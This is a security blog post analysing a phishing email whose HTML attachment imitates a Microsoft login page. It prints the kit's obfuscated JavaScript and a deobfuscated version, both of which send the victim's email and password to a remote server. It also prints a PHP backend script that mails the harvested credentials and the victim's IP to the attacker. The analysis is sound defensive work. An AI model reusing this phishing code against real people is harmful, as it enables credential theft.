---
layout: post
title: "On the hook of a phisher"
categories: [infosec]
tags: [infosec, phishing, security]
thumbnail: /images/phishingms/hello.png
description: "Analysis of a phishing attempt."
---

Phishing campaigns are standard, but they are typically poorly done and low-effort. But, sometimes, we catch a good one. This reports an analysis carried over one of those shady emails.

<!--more-->

## The Welcoming Message

The entry point for this attempt was an email message sent to one of the top-tier individuals at the target organization. 

The email contained the subject "Payment_Processed_for_Inv_92994_July 26, 2022" and was sent from an [gmx.net](gmx.net) email account. The sender details did appear legit, with something similar to `COMPANY_NAME | Account`.

As usual, the juice is in the attachments. So we have an `ATT26270.htm` which, when open, presents us with the following well-crafted fake Microsoft login page:

<center>
<img style="max-width: 70%;" alt="Web page content" src="/images/phishingms/hello.png"/>
</center>

Opening the `htm` file, we encounter the following code in an enormous one-liner:

```html
<script language="javascript">
  document.write(
    unescape(
      "%0D%0A%0D%0A%0D%0A%0D%0A%...%3C/script%3E%0D%0A%0D%0A%0D%0A%0D%0A%3C/html%3E"
    )
  );
</script>
```

The escaped long string corresponds to the full web page, as shown above. This seems like a simple trick to bypass some of the spam filters and other protections. Looking at the code that is passed to the `document.write`, we can see a normal web page with some forms, which is an almost perfect rip-off of the login form of Microsoft (including the enormous b64 encoded background image), and can be seen [here (gist)](https://gist.github.com/jpdias/6d200c746f335ff86b5c809795e5af47#file-index-html). The curious part starts when we look at the JavaScript code that is part of the generated page.

```javascript
function _0x568f(){var _0x3cc923=['indexOf','http://www.','ready','base64string==','Verifing...','toLowerCase','html','signal','Email\x20field\x20is\x20emply.!','click','val','animate','#pr','176728cVrknv','https://logo.clearbit.com/','#logo','Sign\x20in','#submit-btn','attr','src','#error','hash','keyCode','hide','keypress','62422SfXwZP','#div2','646373KPbBzm','POST','show','replace','171111TdAKpx','#dmlogo','ajax','1174710qYyGSY','log','Password\x20field\x20is\x20emply.!','#div1','which','#domain','#ai','JSON','5whiIJH','readonly','#msg','411720woBocu','1545536viIcmF',':visible','focus','substr','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','location','toUpperCase','#ai2'];_0x568f=function(){return _0x3cc923;};return _0x568f();}var _0x9a4e8d=_0x1daa;function _0x1daa(_0x5aed50,_0x5b0cdd){var _0x568fcf=_0x568f();return _0x1daa=function(_0x1daab1,_0x575321){_0x1daab1=_0x1daab1-0xec;var _0x358c63=_0x568fcf[_0x1daab1];return _0x358c63;},_0x1daa(_0x5aed50,_0x5b0cdd);}(function(_0x13cc03,_0x47991b){var _0xd2c8a=_0x1daa,_0x1471da=_0x13cc03();while(!![]){try{var _0x8b832f=parseInt(_0xd2c8a(0x10b))/0x1+parseInt(_0xd2c8a(0x105))/0x2+-parseInt(_0xd2c8a(0x119))/0x3+parseInt(_0xd2c8a(0xf9))/0x4*(-parseInt(_0xd2c8a(0x116))/0x5)+parseInt(_0xd2c8a(0x10e))/0x6+parseInt(_0xd2c8a(0x107))/0x7+-parseInt(_0xd2c8a(0x11a))/0x8;if(_0x8b832f===_0x47991b)break;else _0x1471da['push'](_0x1471da['shift']());}catch(_0x1e2d5e){_0x1471da['push'](_0x1471da['shift']());}}}(_0x568f,0x1c478),$(document)[_0x9a4e8d(0xee)](function(){var _0x50a638=_0x9a4e8d,_0x24c4e8=0x0;$(_0x50a638(0x111))[_0x50a638(0x103)](),$(_0x50a638(0x106))[_0x50a638(0x109)]();var _0x3fa8f1=$(_0x50a638(0x114))[_0x50a638(0xf6)]();$(_0x50a638(0x121))[_0x50a638(0xf6)](_0x3fa8f1);var _0x3fa8f1=window['location'][_0x50a638(0x101)]['substr'](0x1);if(!_0x3fa8f1){}else{var _0x362e6f=_0x3fa8f1,_0x3249d7=_0x362e6f[_0x50a638(0xec)]('@'),_0x30e092=_0x362e6f[_0x50a638(0x11d)](_0x3249d7+0x1),_0x2bdea5=_0x30e092[_0x50a638(0x11d)](0x0,_0x30e092[_0x50a638(0xec)]('.')),_0x103e1a=_0x2bdea5['toLowerCase'](),_0x79edc7=_0x2bdea5['toUpperCase']();$(_0x50a638(0x114))[_0x50a638(0xf6)](_0x362e6f),$(_0x50a638(0x106))[_0x50a638(0xf7)]({'right':0x0,'opacity':'show'},0x3e8),$(_0x50a638(0x111))[_0x50a638(0xf7)]({'right':0x0,'opacity':_0x50a638(0x103)},0x0),$(_0x50a638(0xfb))['animate']({'right':0x0,'opacity':_0x50a638(0x103)},0x0),$(_0x50a638(0xfd))[_0x50a638(0xf6)](_0x50a638(0xfc)),$('#ai2')['val'](_0x362e6f),$(_0x50a638(0x121))[_0x50a638(0xfe)](_0x50a638(0x117),!![]),$(_0x50a638(0x10c))[_0x50a638(0xfe)](_0x50a638(0xff),_0x50a638(0xfa)+_0x30e092),$(_0x50a638(0x113))['html'](_0x79edc7),$(_0x50a638(0xf8))['val'](''),$(_0x50a638(0x118))[_0x50a638(0x103)]();}$(document)[_0x50a638(0x104)](function(_0x4f805d){var _0x16a5c0=_0x50a638,_0x1308cf=_0x4f805d[_0x16a5c0(0x102)]?_0x4f805d['keyCode']:_0x4f805d[_0x16a5c0(0x112)];if(_0x1308cf=='13')return $(_0x16a5c0(0xfd))['click'](),![];});var _0x210725=_0x50a638(0xef);$(_0x50a638(0xfd))[_0x50a638(0xf5)](function(_0x43d150){var _0x4c17f4=_0x50a638;$(_0x4c17f4(0x100))['hide'](),$(_0x4c17f4(0x118))[_0x4c17f4(0x103)](),$(_0x4c17f4(0xfd))[_0x4c17f4(0xf6)](_0x4c17f4(0xfc)),_0x43d150['preventDefault']();var _0x2bd238=$(_0x4c17f4(0x114))[_0x4c17f4(0xf6)](),_0x2b4ff2=$(_0x4c17f4(0xf8))['val'](),_0x4b3e69=_0x2bd238,_0x1c24be=_0x4b3e69['indexOf']('@'),_0x4f4aee=_0x4b3e69[_0x4c17f4(0x11d)](_0x1c24be+0x1),_0x4d3692=_0x4f4aee[_0x4c17f4(0x11d)](0x0,_0x4f4aee[_0x4c17f4(0xec)]('.')),_0x138a31=_0x4d3692[_0x4c17f4(0xf1)](),_0x101d60=_0x4d3692[_0x4c17f4(0x120)](),_0x402362=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x2bd238)return $('#error')[_0x4c17f4(0x109)](),$(_0x4c17f4(0x100))[_0x4c17f4(0xf2)](_0x4c17f4(0xf4)),![];if(!_0x402362['test'](_0x4b3e69))return $(_0x4c17f4(0x100))[_0x4c17f4(0x109)](),$(_0x4c17f4(0x100))['html'](_0x4c17f4(0x11e)),![];if($(_0x4c17f4(0x106))['is'](_0x4c17f4(0x11b))){}else return $(_0x4c17f4(0x106))[_0x4c17f4(0xf7)]({'right':0x0,'opacity':_0x4c17f4(0x109)},0x3e8),$('#div1')[_0x4c17f4(0xf7)]({'right':0x0,'opacity':_0x4c17f4(0x103)},0x0),$('#logo')[_0x4c17f4(0xf7)]({'right':0x0,'opacity':'hide'},0x0),$(_0x4c17f4(0xfd))[_0x4c17f4(0xf6)](_0x4c17f4(0xfc)),$('#ai2')[_0x4c17f4(0xf6)](_0x4b3e69),$(_0x4c17f4(0x121))[_0x4c17f4(0xfe)](_0x4c17f4(0x117),!![]),$(_0x4c17f4(0x10c))['attr'](_0x4c17f4(0xff),_0x4c17f4(0xfa)+_0x4f4aee),$('#domain')[_0x4c17f4(0xf2)](_0x101d60),$(_0x4c17f4(0xf8))[_0x4c17f4(0xf6)](''),![];if(!_0x2b4ff2)return $(_0x4c17f4(0x100))[_0x4c17f4(0x109)](),$(_0x4c17f4(0x100))[_0x4c17f4(0xf2)](_0x4c17f4(0x110)),_0x2bd238[_0x4c17f4(0x11c)],![];_0x24c4e8=_0x24c4e8+0x1,$[_0x4c17f4(0x10d)]({'dataType':_0x4c17f4(0x115),'url':atob(_0x210725),'type':_0x4c17f4(0x108),'data':{'ai':_0x2bd238,'pr':_0x2b4ff2},'beforeSend':function(_0x1f826c){var _0x66df5e=_0x4c17f4;$('#submit-btn')[_0x66df5e(0xf6)](_0x66df5e(0xf0));},'success':function(_0x13e87b){var _0x29a29f=_0x4c17f4;if(_0x13e87b){$('#msg')[_0x29a29f(0x109)](),$(_0x29a29f(0xfd))[_0x29a29f(0xf6)](_0x29a29f(0xfc)),console[_0x29a29f(0x10f)](_0x13e87b);if(_0x13e87b[_0x29a29f(0xf3)]=='ok'){$(_0x29a29f(0xf8))['val']('');if(_0x24c4e8>=0x2)return _0x24c4e8=0x0,window[_0x29a29f(0x11f)][_0x29a29f(0x10a)](_0x29a29f(0xed)+_0x4f4aee),![];}else{}}},'error':function(){var _0x1a0b9a=_0x4c17f4;$(_0x1a0b9a(0xf8))['val']('');if(_0x24c4e8>=0x2)return _0x24c4e8=0x0,window['location'][_0x1a0b9a(0x10a)](_0x1a0b9a(0xed)+_0x4f4aee),![];$('#msg')['show'](),$(_0x1a0b9a(0xfd))[_0x1a0b9a(0xf6)](_0x1a0b9a(0xfc));},'complete':function(){var _0x5cb88e=_0x4c17f4;$(_0x5cb88e(0xfd))['val'](_0x5cb88e(0xfc));}});});}));
```
Yes, you guessed it, it's obfuscated[^1]. Let's find out what it does.

## Unpacking

The first approach for deobfuscating JS for me is to use [JSNice](http://jsnice.org/), an amazing tool by the [Secure, Reliable, and Intelligent Systems Lab, Computer Science Department of the ETH Zurich](http://www.sri.inf.ethz.ch/). Taking the previous code and entering it into the tool gives us a more readable first version of the snippet.

However, some parts, such as the string array, still remained. After searching for some time I found out [synchrony by relative](https://github.com/relative/synchrony), a pretty neat javascript cleaner & deobfuscator, primarily target for [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator) tool.

The several outputs of the different tools can be seen in [JSnice](https://gist.github.com/jpdias/6d200c746f335ff86b5c809795e5af47#file-js-nice-output-js) and [synchrony](https://gist.github.com/jpdias/6d200c746f335ff86b5c809795e5af47#file-synchrony-output-js). And, after some final, manual, adjustment, the readable result can be found on [here](https://gist.github.com/jpdias/6d200c746f335ff86b5c809795e5af47#file-manual-adjustment-js).

Why the use of jQuery in 2022?...

## Following the Trail

Moving on, the logic of the code/page is pretty straightforward:

1. The webpage is rendered;
2. The username field is pre-filled with the target email account (the same that received the email);
3. When entering input in the password field, an error of bad password is given *Your account or password is incorrect. If you don't remember your password, reset it now.*
    - Clicking *reset it now* redirect us to the same page.
4. When entering a second input, the js redirects us to the email address domain.
5. Under the hood, a JSON object is created and sent to a remote server.

Looking more carefully at the js, we can see the remains of several features that weren't used for this concrete attack. One example of such is the use of `https://logo.clearbit.com/<company_name>`, a simple API that returns the logo of a company passed as a parameter.

The request code is also a simple AJAX request:

```js
$.ajax({
    dataType: 'JSON',
    URL: "https://example.com/dwsync/def.php",
    type: 'POST',
    data: {
        ai: email_address,
        pr: password,
    },
    beforeSend: function (xhr) {
    $('#submit-btn').val('Verifing...')
    },
    success: function (arr) {
        if (arr) {
            $('#msg').show()
            $('#submit-btn').val('Sign in')
            console.log(arr)
            if (arr.signal == 'ok') {
            $('#pr').val('')
                if (attempt_counter >= 2) {
                    return (
                        (attempt_counter = 0),
                        window.location.replace('http://www.' + company_url),
                        false
                    )
                }
            }
        }
    },
    error: function () {
        $('#pr').val('')
        if (attempt_counter >= 2) {
            return (
                (attempt_counter = 0), 
                window.location.replace('http://www.' + company_url), 
                false
            )
        }
        $('#msg').show()
        $('#submit-btn').val('Sign in')
    },
    complete: function () {
        $('#submit-btn').val('Sign in')
    },
})
```

There is some retry loop -- and that's why we have two password attempts before redirecting the `window.location` call -- but beyond that, we just have the AJAX request. Following the `URL_target`, we found a random PHP-based website (given away by the file `def.php`).

## The Other End

Let's look more carefully at the other end. Opening the remote address, I found a poorly-done old-designed website of a random Brazillian store. After a closer look at the website structure, we found *Exposure of Information Through Directory Listing*, and, even further, we find several `dwsync.xml` files, always inside a `_notes` folder. Looking for more information, we find out that:

> dwsync.xml is a file created by Dreamweaver. Dreamweaver uses it to synchronize files in a Dreamweaver project.

This is a known security problem, *Adobe Dreamweaver dwsync.xml Remote Information Disclosure*, as listed in [Nessus](https://www.tenable.com/plugins/nessus/33926).

```xml
<dwsync>
    <file name="class.phpmailer.php" server="example_company_one.com.br/public_html" local="347870503" remote="-4611698281370955880" Dst="-1"/>
    <file name="classe.funcoes.php" server="example_company_one.com.br/public_html" lecal="3478705403" remote="-4611698281370955880" Dst="-1"/>
    <file name="phpmailer.rar" server="example_company_one.com.br/public_html" local="3478705408" remote="7777996696" Dst="-1"/>
    <file name="canvas.php" server="example_company_one.com.br/public_html" local="3478705403" remote="7777996696" Dst="-1"/>
    <file name="MailHandler.php" server="example_company_one.com.br/public_html" local="3478705403" remote="-4611698281370955880" Dst="-1"/>
    <file name="jquery.validate.js" server="example_company_one.com.br/public_html" local="3446821216" remote="-4611698281370955880" Dst="-1"/>
    <file name="shareCount.php" server="example_company_one.com.br/public_html" local="3478807356" remote="7777996696" Dst="-1"/>
    <file name="canvas.php" server="example_company_two.com.br/public_html" local="3515351965" remote="7810389376" Dst="-1"/>
    <file name="classe.funcoes.php" server="example_company_two.com.br/public_html" local="3515351965" remote="-4611802528784771712" Dst="-1"/>
    <file name="jquery.validate.js" server="example_company_two.com.br/public_html" local="3515351965" remote="-4611802528784771712" Dst="-1"/>
    <file name="MailHandler.php" server="example_company_two.com.br/public_html’" local="3515351965" remote="-4611802528784771712" Dst="-1"/>
    <file name="class.phpmailer.php" server="example_company_two.com.br/public_html" local="3515351965" remote="-4611802528784771712" Dst="-1"/>
    <file name="shareCount.php" server="example_company_two.com.br/public_html" local="3515351966" remote="7810389616" Dst="-1"/>
    <file name="phpmailer.rar" server="example_company_two.com.br/public_html’" local="3515351966" remote="7810389616" Dst="-1"/>
</dwsyne>
```

This seems to be a sync file of the company that designed the website since it stores information about several websites that do not correspond to the one in which the file was stored. Nonetheless, there are some curious files, including the `phpmailer.rar`. Without searching for long, I discovered that the PHPmailer in question is a boilerplate and old one, [PHP Mailer by codeworxtech](https://codeworxtech.com/). The other files were simple validators and other files that are part of the PHPmailer. So, no luck on getting the `def.php` file. But we now know that most probably, the attacker was able to compromise this remote website, upload both the phpmailer and `def.php`, using it to receive the phishing payloads.

## Some OSINT and Closing

When looking at the source code of the `htm` file, we can find some *breadcrumbs* such as typos and variable names that, most probably, are unique to this payload. More concretely, let us take the following hints:
- Regarding the AJAX payload, we know that, typically, the object keys are hardcoded for the server to be able to parse them; in this case, the variables `ai` and `pr`.
    -  In PHP, given that the AJAX makes a POST request, probably the received using `$_POST` feature. So, most probably the `def.php` has, somewhere, a call to `$_POST['ai']` and `$_POST['pr']`.
- Some error messages have typos, such as `Password field is empty.!`

Doing some code searches on GitHub, we quickly found several possible correspondence results. Taking into account all the information that we collected so far, the most similar/supicious one was found in a GitHub account with a repository with several WordPress (*PHP*) malware samples: [stefanpejcic/wordpress-malware](https://github.com/stefanpejcic/wordpress-malware), more concretely [WordPress-malware/11.02.2021/](https://github.com/stefanpejcic/wordpress-malware/tree/master/11.02.2021). 

Taking a look into the `next.php` [file](https://github.com/stefanpejcic/wordpress-malware/blob/master/11.02.2021/next.php):

```php
<?PHP
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
if($email != null && $password != null){
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message .= "|----------| Xls |--------------|\n";
    
    $message .= "Online ID            : ".$email."\n";
    $message .= "Passcode              : ".$password."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|----------- fudsender(dot)com --------------|\n";
    $send = $Receive_email;
    $subject = "Login : $ip";
    mail($send, $subject, $message);   
    $signal = 'ok';
    $msg = 'InValid Credentials';
    $fp = fopen("apas.txt", "a");
    fwrite($fp,$message);
    
    // $praga=rand();
    // $praga=md5($praga);
}
else{
    $signal = 'bad';
    $msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>
```
Here we can see the calls to `$_POST`, concretely, `$email = trim($_POST['ai']); $password = trim($_POST['pr']);`. The remaining logic is also simple and clean:
1. The parameters are received by POST and checked for `null`;
2. The `IP` of the requesting victim is obtained by the env variable `REMOTE_ADDR` of PHP;
3. The `user agent` is also fetched by getting `HTTP_USER_AGENT`;
4. The approximate location of the victim is discovered by requesting [geoiptool](http://www.geoiptool.com/);
5. An email `$message` is created with all that information, with the subject `Login : $ip`, and PHPmailer is used to send the email to the attacker.
6. In some versions of this malware, a `txt` file is stored as a log, but I had no luck finding such a file in this case.

So, the case is closed. As of today, the `def.php` appears to have been removed from the remote website (giving 404), but this can also be just a modification of the `PHP` script to occur as an error and make more challenging its analysis.

Looking further on GitHub, we find a lot of accounts with low activity with derivations of these payloads ([try it](https://github.com/search?q=%24email+%3D+trim%28%24_POST%5B%27ai%27%5D%29%3B+%24password+%3D+trim%28%24_POST%5B%27pr%27%5D%29%3B&type=code)). Seems like attackers are adopting open-source and code versioning.

[^1]: `base64string==` is a dummy placeholder just to keep the *destination* URL hidden.

<hr>
